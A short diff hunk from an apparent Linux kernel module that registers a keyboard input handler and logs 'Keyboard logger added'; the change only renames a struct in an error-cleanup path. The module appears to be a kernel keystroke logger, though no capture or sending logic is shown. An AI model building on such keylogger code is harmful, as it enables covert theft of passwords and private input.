@@ -109,7 +109,7 @@ static int logger_init(void) {
 	}			
 	res=procFsInit();
 	if(res) {
-		input_unregister_handler(&wiggler.inputHandler);
+		input_unregister_handler(&core.inputHandler);
 		return res;
 	}
 	printk(KERN_INFO "Keyboard logger added: %s\n",res?"FAIL":"Success");
